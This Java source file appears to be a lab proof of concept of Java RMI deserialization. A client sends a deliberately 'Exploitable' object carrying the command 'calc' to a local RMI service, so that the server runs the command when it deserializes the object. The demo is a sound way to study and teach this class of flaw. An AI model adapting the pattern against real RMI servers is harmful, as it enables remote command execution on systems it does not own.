package org.trganda.client;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import org.trganda.remote.RemoteService;
import org.trganda.util.Exploitable;

public class EvilRMIClient {
    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        RemoteService rs = (RemoteService) registry.lookup(name);
        /**
         * Suppose the server has a exploitable Class with a readObject() method
         * and the param is controlled.
         */ 
        Exploitable poc = new Exploitable();
        poc.setParam("calc");
        /**
         * When we call remote method, the remote server will try to deserialize 
         * the Exploitable object we passed and the readObject() was called, 
         * leading the command to be executed.
         */
        rs.doSome(poc);
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient rc = new EvilRMIClient();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
